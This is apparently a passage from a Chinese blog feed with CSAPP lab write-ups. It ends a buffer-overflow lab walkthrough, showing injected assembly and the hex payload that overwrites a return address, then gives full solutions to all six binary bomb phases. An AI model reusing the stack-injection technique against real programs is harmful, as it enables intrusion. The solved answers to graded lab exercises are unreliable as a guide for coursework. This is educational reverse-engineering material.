行代码，而我们要让函数执行第 12 行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123; <br><span class="hljs-type">int</span> val; <br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> local = <span class="hljs-number">0xdeadbeef</span>; <br>    entry_check(<span class="hljs-number">3</span>); <span class="hljs-comment">/* Make sure entered this function properly */</span> <br>    val = getbuf(); <br><span class="hljs-comment">/* Check for corrupted stack */</span> <br><span class="hljs-keyword">if</span> (local != <span class="hljs-number">0xdeadbeef</span>) &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>); <br>&#125; <br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val == cookie) &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val); <span class="hljs-comment">// 12 行</span><br>        validate(<span class="hljs-number">3</span>); <br>    &#125; <br>   <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 15 行</span><br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val); <br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这意味着我需要在 <code>getbuf()</code> 结束后回到 <code>test()</code> 原本的位置，并将 cookie 作为 <code>getbuf()</code> 的返回值传给 <code>test()</code> 。为了做到这一点，在攻击过程中，需要将 <code>%ebp</code> 的值恢复，使程序不会因为外部攻击而出错崩溃。可以使用GDB 调试器找到调用<code>getbuf</code> 函数之后，<code>%ebp</code> 的值：<code>0xffffb898</code>。</p><p>我打算故技重施，直接插入攻击代码，先修改返回值为我的 cookie，再将正常返回地址压入栈，最后保持存放 <code>ebp</code> 值不变。攻击代码我已写好：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nasm">movl $0x46dd0bfe, %eax<br>push $0x0804901e<br>ret<br></code></pre></td></tr></table></figure><p><code>0x0804901e</code> 值就是正常的返回地址，<code>call</code> 语句的下一条指令地址。</p><p><img src="/img/CSAPP/lab3/10.png" alt=""></p><p>​仍用之前的办法将攻击指令转为二进制代码，这次代码长度变短，正好11个字节，再放入<code>0xffffb898</code> 和攻击代码的起始地址。大功告成：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b8</span> fe <span class="hljs-number">0</span>b dd <span class="hljs-number">46</span> <span class="hljs-number">68</span> <span class="hljs-number">1</span>e <span class="hljs-number">90</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">98</span> b8 ff ff <span class="hljs-number">6</span>c b8 ff ff<br></code></pre></td></tr></table></figure><p><img src="/img/CSAPP/lab3/11.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
      <tag>StackOverflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入理解计算机系统之二进制炸弹实验</title>
    <link href="/2021/05/26/2021-5-26-CSAPPLab02/"/>
    <url>/2021/05/26/2021-5-26-CSAPPLab02/</url>
    
    <content type="html"><![CDATA[<h1>深入理解计算机系统——二进制炸弹实验</h1><h2 id="实验简介">实验简介</h2><p>二进制炸弹是一个作为目标代码文件的程序。运行时，它提示用户输入若干个不同的字符串。如果其中一个不正确，炸弹就会“爆炸”，打印出一条错误信息。用户必须通过对程序的反汇编和逆向工程来求出这六个字符串，解决这些炸弹。该实验的主要目的是，深入理解汇编语言，并学习使用 gdb 调试器。</p><p>在本次实验中，我们需要拆解七个炸弹（其中一个为隐藏炸弹）。</p><h2 id="实验预备">实验预备</h2><p>下载完实验材料后，有两个文件值得关注：<code>bomb</code> 和 <code>bomb.c</code> 。<code>bomb</code> 就是要“拆解”的目标文件代码，而 <code>bomb.c</code> 只是辅助理解的部分源代码文件。首先，对 <code>bomb</code> 进行逆向：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">objdump -d bomb &gt;&gt; bomb.s<br></code></pre></td></tr></table></figure><p>得到反汇编文件 <code>bomb.s</code> ，然后，在该文件中找到相关函数的反汇编代码，开始拆解炸弹！</p><h2 id="拆弹">拆弹</h2><h3 id="phase-1">phase_1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nasm">phase_1:<br>    push   %ebp<br>    mov    %esp,%ebp<br>    sub    $0x8,%esp<br>    movl   $0x8049948,0x4(%esp)<br><br>    mov    0x8(%ebp),%eax<br>    mov    %eax,(%esp)<br>    call    &lt;strings_not_equal&gt;<br>    test   %eax,%eax<br>    je     &lt;phase_1+0x22&gt;<br>    call  &lt;explode_bomb&gt;<br>    leave  <br>    ret    <br></code></pre></td></tr></table></figure><p>比较字符串，若相等就不会爆炸。找到目标字符串。</p><p>gdb找到：</p><p><img src="/img/CSAPP/lab2/1.png" alt=""></p><p>成功！</p><p><img src="/img/CSAPP/lab2/1_1.png" alt=""></p><h3 id="phase-2">phase_2</h3><p>再来看第二个炸弹的反汇编代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs nasm">phase_2:<br>    push   %ebp; set up stack size==0x28<br>    mov    %esp,%ebp<br>    sub    $0x28,%esp<br>    lea    -0x1c(%ebp),%eax; eax=ebp-0x1c<br>    mov    %eax,0x4(%esp); ebp-0x1c=(esp+0x4)<br>    mov    0x8(%ebp),%eax; (ebp+0x8)=(esp)<br>    mov    %eax,(%esp)<br>    call   &lt;read_six_numbers&gt;; read_six_numbers() needs 2 para<br>    movl   $0x1,-0x4(%ebp); loop begin i=0x1<br>    jmp    &lt;phase_2+0x3f&gt;<br>    mov    -0x4(%ebp),%eax; eax=i<br>    mov    -0x1c(%ebp,%eax,4),%edx;edx=(ebp-0x1c+4*eax)<br>    mov    -0x4(%ebp),%eax<br>    dec    %eax; eax=i-1<br>    mov    -0x1c(%ebp,%eax,4),%eax; eax=(ebp-0x1c+4*eax)<br>    add    $0x5,%eax; eax+=0x5<br>    cmp    %eax,%edx ; is equal? explode if not<br>    je     &lt;phase_2+0x3c&gt;<br>    call  &lt;explode_bomb&gt;<br>    incl   -0x4(%ebp); (ebp-0x4)++<br>    cmpl   $0x5,-0x4(%ebp); loop unit i==5<br>    jle   &lt;phase_2+0x21&gt;<br>    leave  <br>    ret    <br><br></code></pre></td></tr></table></figure><p>仔细阅读后发现，程序先调用了 <code>read_six_numbers</code> 的函数，而在之前，程序准备了一个参数放在 <code>%esp+4</code> 处，该参数的意义需要进一步阅读下面的代码才能知晓。之后，程序就进入了一个循环，用于不断测试条件，如果条件不符，炸弹就会爆炸！显然，该循环就是关键，这个炸弹就是考验汇编语言的循环部分了。经整理，循环用 C 代码表示如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">*a = &amp;(ebp<span class="hljs-number">-0x1c</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5</span>; i++) &#123;<br>    edx=a[i];<br>    eax=a[i<span class="hljs-number">-1</span>]+<span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">if</span> (eax != edx)<br>        explode_bomb();<br>&#125;<br></code></pre></td></tr></table></figure><p>现在，明白 <code>read_six_numbers</code> 函数的参数 <code>ebp-0x1c</code> 是一个数组地址。大致可以猜到，只要输入 6 个数字，相邻两个差为 5 即可拆解炸弹。</p><p>等等，并不是任意的差为 5 的等差数列都满足要求！对首项，<code>read_six_numbers</code> 函数也有要求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nasm">read_six_numbers:<br>; ....<br>mov    0x8(%ebp),%eax<br>    mov    %eax,(%esp)<br>    call    &lt;sscanf@plt&gt;<br>    mov    %eax,-0xc(%ebp)<br>    cmpl   $0x5,-0xc(%ebp); compare with (ebp-0xc) 5<br>    jg      &lt;read_six_numbers+0x62&gt;<br>    call    &lt;explode_bomb&gt;<br>    add    $0x30,%esp<br></code></pre></td></tr></table></figure><p>看起来，输入的首项必须比 5 大，那么首项就是 6 吧 :smile:。</p><p>验证一下：</p><p><img src="/img/CSAPP/lab2/2.png" alt=""></p><h3 id="phase-3">phase_3</h3><p>再接再厉，开始拆解第三个炸弹。<code>phase_3</code> 函数的汇编代码明显长了不少，先看第一部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nasm">phase_3:<br>; ...<br>    movl   $0x0,-0x8(%ebp)<br>    movl   $0x0,-0x4(%ebp)<br>    lea    -0x10(%ebp),%eax<br>    mov    %eax,0xc(%esp); (esp+0xc)=ebp-0x10<br>    lea    -0xc(%ebp),%eax<br>    mov    %eax,0x8(%esp); (esp+0x8)=ebp-0xc<br>    movl   $0x8049972,0x4(%esp) ; (esp+0x4)=??<br><br>    mov    0x8(%ebp),%eax<br>    mov    %eax,(%esp)<br>    call    &lt;sscanf@plt&gt;<br>    mov    %eax,-0x4(%ebp)<br>    cmpl   $0x1,-0x4(%ebp); eax &gt; 1, if not explode!<br>    jg      &lt;phase_3+0x43&gt;<br>    call   &lt;explode_bomb&gt;<br>    mov    -0xc(%ebp),%eax; eax &gt; 7 will explode!<br>    mov    %eax,-0x14(%ebp); (ebp-0xc)-&gt;(ebp-0x14)<br>    cmpl   $0x7,-0x14(%ebp)<br>    ja    &lt;phase_3+0x95&gt; ; jmp to call &lt;explode_bomb&gt;<br></code></pre></td></tr></table></figure><p>注意到，程序调用了函数 <code>sscanf</code> 。该函数的意义是，从第一个参数的字符串中读取变量的值。就本次调用而言，函数共准备了四个参数，分别位于<code>%esp</code>   <code>%esp+0x4</code> 、 <code>%esp+0x8</code> 和  <code>%esp+0xc</code> 。其中，<code>%esp</code> 就是我们输入的行字符串，这 <code>0x8049972</code> 表示的是：</p><p><img src="/img/CSAPP/lab2/3.png" alt=""></p><p>看来是需要输入两个整数。那么，最后的两个参数就一定是输入的整数了，<code>%esp+0x8</code> 是第一个整数地址，<code>%esp+0xc</code> 应该是第二个整数地址。<code>sscanf</code> 函数完成后，读入的两个整数就位于 <code>ebp-0xc</code> 和 <code>ebp-0x10</code> 中。</p><p>然后对这两个整数做简单判断：要求第一个整数要大于 1 且小于等于 7，否则炸弹会爆炸。接下来，看函数的第二部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs nasm">;...<br>mov    -0x14(%ebp),%edx; edx=(ebp-0x14)<br>mov    0x8049978(,%edx,4),%eax; eax=(edx*4+0x8049978)<br>jmp    *%eax; a switch table<br>addl   $0x108,-0x8(%ebp)<br>subl   $0x1e5,-0x8(%ebp)<br>addl   $0x19a,-0x8(%ebp)<br>subl   $0x35f,-0x8(%ebp)<br>addl   $0x239,-0x8(%ebp)<br>subl   $0x38e,-0x8(%ebp)<br>addl   $0x38e,-0x8(%ebp)<br>subl   $0xe3,-0x8(%ebp)<br>jmp     &lt;phase_3+0x9a&gt;<br>call    &lt;explode_bomb&gt;<br>mov    -0xc(%ebp),%eax; eax=(ebp-0xc)<br>cmp    $0x5,%eax; eax &gt; 5 explode!<br>jg       &lt;phase_3+0xaa&gt;<br>mov    -0x10(%ebp),%eax; eax=(ebp-0x10)<br>cmp    %eax,-0x8(%ebp); compare eax with (ebp-0x8)<br>je       &lt;phase_3+0xaf&gt;<br>call    &lt;explode_bomb&gt;<br>leave  <br>ret    <br></code></pre></td></tr></table></figure><p>第二句汇编又出现了一个奇怪的数字 <code>0x8049978</code> ，在gdb 调试程序中，打开一看，就会发现其中的奥秘：</p><p><img src="/img/CSAPP/lab2/3_1.png" alt=""></p><p>在<code>0x8049978</code> 处，存放了后面 8 条语句的地址！显然，这就是一个跳转表，PC 接下来该指向哪里，完全取决于 <code>%edx</code> ，也即输入的第一个数字的值。如果第一个数为 2 ，那么程序最终计算 <code>%ebp-0x8</code> 处的值就是 <code>0xff91</code> （当然不是计算得到的，通过gdb调试器得出的结果）。于是输入的数值可以为 2 和 -111。</p><p>经验证，第三颗炸弹已被拆除，感兴趣的话，也可以尝试一下其他数值。不过注意到，程序最后规定，第一个数字不能大于 5 ！</p><p><img src="/img/CSAPP/lab2/3_2.png" alt=""></p><h3 id="phase-4">phase_4</h3><p>第四颗炸弹：前面和第三颗炸弹一样，调用了 <code>sscanf</code> 函数。那么这次，<code>sscanf</code> 函数使用了什么字符串呢？看起来只要输入一个整数就行：</p><p><img src="/img/CSAPP/lab2/4.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs nasm">phase_4:<br>    push   %ebp<br>    mov    %esp,%ebp<br>    sub    $0x28,%esp<br>    lea    -0xc(%ebp),%eax<br>    mov    %eax,0x8(%esp); (esp+0x8)=(ebp-0xc)<br>    movl   $0x8049998,0x4(%esp) ;(esp+0x4)=??<br>    mov    0x8(%ebp),%eax<br>    mov    %eax,(%esp)<br>    call     &lt;sscanf@plt&gt;<br>    mov    %eax,-0x4(%ebp)<br>    cmpl   $0x1,-0x4(%ebp) ; eax!= 0x1 explode!<br>    jne     &lt;phase_4+0x30&gt;<br>    mov    -0xc(%ebp),%eax<br>    test   %eax,%eax; eax=(ebp-0xc)<br>    jg      &lt;phase_4+0x35&gt; ; eax &amp; eax &gt; 0, if not explode!<br>    call    &lt;explode_bomb&gt;<br>    mov    -0xc(%ebp),%eax<br>    mov    %eax,(%esp)<br>    call     &lt;func4&gt;<br>    mov    %eax,-0x8(%ebp)<br>    cmpl   $0x37,-0x8(%ebp)<br>    je      &lt;phase_4+0x4e&gt;; 0x37==eax if not explode!<br>    call   &lt;explode_bomb&gt;<br>    leave  <br>    ret    <br></code></pre></td></tr></table></figure><p>经gdb调试后，<code>%ebp-0xc</code> 是输入的整数，必须大于 0 ，而 <code>sscanf</code> 函数的返回值必须为 1，否则炸弹会引爆。然后，程序就开始调用 <code>func4</code> 函数了。注意到，<code>func4</code> 函数的返回值必须等于 <code>0x37</code> 否则炸弹会爆炸。那么 <code>func4</code> 函数是怎么计算的呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs nasm">func4:<br>push   %ebp<br>    mov    %esp,%ebp<br>    push   %ebx<br>    sub    $0x8,%esp<br>    cmpl   $0x1,0x8(%ebp); (ebp+0x8)&gt;0x1?<br>    jg       &lt;func4+0x16&gt;<br>    movl   $0x1,-0x8(%ebp); (ebp-0x8)=0x1<br>    jmp     &lt;func4+0x37&gt;<br>    mov    0x8(%ebp),%eax ; eax=(ebp+0x8)<br>    dec    %eax<br>    mov    %eax,(%esp) ; esp=eax-1<br>    call    &lt;func4&gt;<br>    mov    %eax,%ebx<br>    mov    0x8(%ebp),%eax<br>    sub    $0x2,%eax<br>    mov    %eax,(%esp)<br>    call   &lt;func4&gt;<br>    add    %eax,%ebx ; ebx += eax<br>    mov    %ebx,-0x8(%ebp); (ebp-0x8)=ebx<br>    mov    -0x8(%ebp),%eax ; eax=ebx<br>    add    $0x8,%esp<br>    pop    %ebx<br>    pop    %ebp<br>    ret    <br></code></pre></td></tr></table></figure><p>仔细阅读后，整理成如下 C 代码：看起来就是一个斐波那契数列 :joy:。结合 <code>func4</code> 函数的返回值必须是 <code>0x37</code> ，那么很容易想到，问题是让我们求出，斐波那契数列的哪一项是 <code>0x37</code> 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) &#123;<br>        sum = func4(n<span class="hljs-number">-1</span>)+func4(n<span class="hljs-number">-2</span>);<br>        <span class="hljs-keyword">return</span> sum;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        eax=<span class="hljs-number">0x1</span><br>        <span class="hljs-keyword">return</span> eax;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>嗯，第 9 项，输入 9 就可以拆除炸弹了。</p><p><img src="/img/CSAPP/lab2/4_1.png" alt=""></p><h3 id="phase-5">phase_5</h3><p>与炸弹四一样，phase_5 阶段一开始也调用了 <code>sscanf</code> 函数，用 gdb 调试，找到要求输入的字符串：需要给出两个整数。</p><p><img src="/img/CSAPP/lab2/5.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nasm">phase_5:<br>push   %ebp<br>mov    %esp,%ebp<br>sub    $0x38,%esp<br>lea    -0x18(%ebp),%eax<br>mov    %eax,0xc(%esp); (%esp+0xc)=&amp;%ebp-0x18<br>lea    -0x14(%ebp),%eax<br>mov    %eax,0x8(%esp); (%esp+0x8)=&amp;%ebp-0x14<br>movl   $0x8049972,0x4(%esp) ; (%esp+0x4)=??<br>mov    0x8(%ebp),%eax<br>mov    %eax,(%esp)<br>call   8048868 &lt;sscanf@plt&gt;<br></code></pre></td></tr></table></figure><p>当输入了两个整数后（已经很熟悉了， <code>%esp+0x8</code> 和 <code>%esp+0xc</code> 指向了两个输入整数的地址，而<code>%ebp-x14</code> 和 <code>%ebp-0x18</code> 存放了整数值），接下来看看炸弹怎么对这两个整数进行操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs nasm">mov    -0x14(%ebp),%eax<br>and    $0xf,%eax<br>mov    %eax,-0x14(%ebp);first int &amp; 0xf, write back<br>mov    -0x14(%ebp),%eax<br>mov    %eax,-0x8(%ebp)<br>movl   $0x0,-0x10(%ebp)<br>movl   $0x0,-0xc(%ebp)<br>jmp    &lt;phase_5+0x6a&gt;<br>incl   -0x10(%ebp); loop i=(%ebp-0x10)<br>mov    -0x14(%ebp),%eax<br>mov    0x804a5c0(,%eax,4),%eax ; 0x804a5c0 ??<br>mov    %eax,-0x14(%ebp)  ; write back <br>mov    -0x14(%ebp),%eax <br>add    %eax,-0xc(%ebp) ; accumulate (%ebp-0xc)<br>mov    -0x14(%ebp),%eax <br>cmp    $0xf,%eax;; %eax == 0xf ? ne to loop<br>jne    8048d80 &lt;phase_5+0x54&gt;<br>cmpl   $0xb,-0x10(%ebp)<br>jne    8048dac &lt;phase_5+0x80&gt;; i must be 0xb, or explode!<br>mov    -0x18(%ebp),%eax<br>cmp    %eax,-0xc(%ebp)<br>je     8048db1 &lt;phase_5+0x85&gt; ; second int == (%ebp-0xc). or explode!<br>call   8049656 &lt;explode_bomb&gt;<br>leave  <br>ret    <br></code></pre></td></tr></table></figure><p>仔细阅读汇编代码，初步得出结论：输入的第一个整数会作为一个数组的索引，在一个循环中不断累加，得到的累加值会与输入的第二个整数比较。炸弹不爆炸的条件是：循环次数必须为 11 次（0x1-0xb），且第二个整数的值与累加值相等。</p><p>首先，来看一下位于 <code>0x804a5c0</code> 的数组吧：</p><p><img src="/img/CSAPP/lab2/5_1.png" alt=""></p><p>由于要求循环次数必须为 11 次，而终止循环的条件是 <code>%eax == 0xf</code> ，也就是说取到数组中的 <code>0xf</code> 才能结束循环，那我们从后往前推，要取到 <code>0xf</code> ，必须取到 <code>0x6</code> （因为 <code>0xf</code> 的索引是 6），取到 <code>0x6</code> ，必须先取到 <code>0xe</code> ……</p><p>于是有：0xf -&gt; 0x6 -&gt; 0xe -&gt; 0x2 -&gt; 0x1 -&gt; 0xa -&gt; 0x0 -&gt; 0x8 -&gt; 0x4 -&gt; 0x9 -&gt; 0xd -&gt; 0xb。累加起来值为（不算0xb）82。于是，输入 11 和 82 就可以拆解炸弹。</p><p><img src="/img/CSAPP/lab2/5_2.png" alt=""></p><h3 id="phase-6">phase_6</h3><p>最后一个炸弹，继续前进。注意到，phase_6 先调用了 <code>atoi</code> 函数，看来是要把某个字符串变为整数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nasm">phase_6:<br>push   %ebp<br>mov    %esp,%ebp<br>sub    $0x18,%esp<br>movl   $0x804a66c,-0x8(%ebp) ; 0x804a66c ???<br>mov    0x8(%ebp),%eax; %ebp+0x8 ??<br>mov    %eax,(%esp)<br>call     &lt;atoi@plt&gt;<br></code></pre></td></tr></table></figure><p>首先，还是要用 gdb 调试器看看 <code>0x804a66c</code> 和传入的参数 <code>%ebp+0x8</code> 是什么东西。</p><p><img src="/img/CSAPP/lab2/6.png" alt=""></p><p>得出的信息有点少（主要是看不懂这个字符串），而且 <code>0x804a66c</code> 处的字符串为空。随后，程序很快就调用了 <code>fun6</code> 函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nasm">call     &lt;atoi@plt&gt;<br>mov    %eax,%edx<br>mov    -0x8(%ebp),%eax<br>mov    %edx,(%eax); ((%ebp-0x8)) = %edx<br>mov    -0x8(%ebp),%eax<br>mov    %eax,(%esp); %eax as arg<br>call   8048db3 &lt;fun6&gt;<br></code></pre></td></tr></table></figure><p><code>fun6</code> 函数完成后，会进入一个循环，从下面的汇编代码可以看到，循环中不断重复的一条有效指令就是 <code>(%ebp-0x4)=((%ebp-0x4)+0x8)</code> 。从这点上看，可以理解为 <code>(%ebp-0x4)</code> 是一个指针，而这种循环更像是对链表的遍历。后来，根据我的不断尝试，发现该炸弹确实是对一个链表进行操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nasm">mov    %eax,-0x8(%ebp)<br>mov    -0x8(%ebp),%eax; fun6 return value is %eax<br>mov    %eax,-0x4(%ebp)  ; (%ebp-0x4)=%eax<br>movl   $0x1,-0xc(%ebp)  ; (%ebp-0xc)=1  i=1<br>jmp    8048e8f &lt;phase_6+0x48&gt; ; loop1<br>mov    -0x4(%ebp),%eax <br>mov    0x8(%eax),%eax <br>mov    %eax,-0x4(%ebp) ; (%ebp-0x4)=((%ebp-0x4)+0x8)<br>incl   -0xc(%ebp); i++<br>cmpl   $0x4,-0xc(%ebp)<br>jle    8048e83 &lt;phase_6+0x3c&gt; ; (%ebp-0xc) &lt;= 4 to loop<br>mov    -0x4(%ebp),%eax<br>mov    (%eax),%edx; %edx=((%ebp-0x4)) =[0x804a60c]<br>mov    0x804a66c,%eax<br>cmp    %eax,%edx; %edx == 0x804a66c ??<br>je     8048ea8 &lt;phase_6+0x61&gt; ; if not eq, explode!<br>call   8049656 &lt;explode_bomb&gt;<br>leave  <br>ret    <br></code></pre></td></tr></table></figure><p><code>fun6</code> 函数非常复杂，但仔细观察发现，该函数运行后产生的结果与我们给的输入无关。那么就有一个技巧，可以用gdb调试器在 <code>fun6</code> 函数返回后设置断点，观察其返回值 <code>%eax==0x804a618</code> 。然后，上述汇编代码的循环会执行 5 次，我使用 gdb 调试器将整个链表的值都打印在下图中。<code>0x804a618</code> 对应的是 node7，而上面汇编代码中，要求 <code>%edx==[0x804a66c]</code> ，其对应的是 node0，经过多次实验，我发现，node0 为用户输入的值（见下图，输入 5 时）。</p><p><img src="/img/CSAPP/lab2/6_1.png" alt=""></p><p>那么问题来了，应该输入什么才能拆解炸弹呢？顺着程序过一遍，一开始 <code>%eax=0x804a618</code>，指向了 node7，然后根据 <code>(%ebp-0x4)=((%ebp-0x4)+0x8)</code> ，链接到下一个节点，一共执行 5 次，先后是 node3、node5、node9、node8 ，遍历后， <code>%ebp-0x4</code>中的值应该为 <code>0x804a60c</code>（见下图），当从中取出的值也为 <code>0x20e</code> 时，才能拆解炸弹。</p><p><img src="/img/CSAPP/lab2/6_3.png" alt=""></p><p>如下图，已经成功拆解完 6 个炸弹。</p><p><img src="/img/CSAPP/lab2/6_2.png" alt=""></p><h3 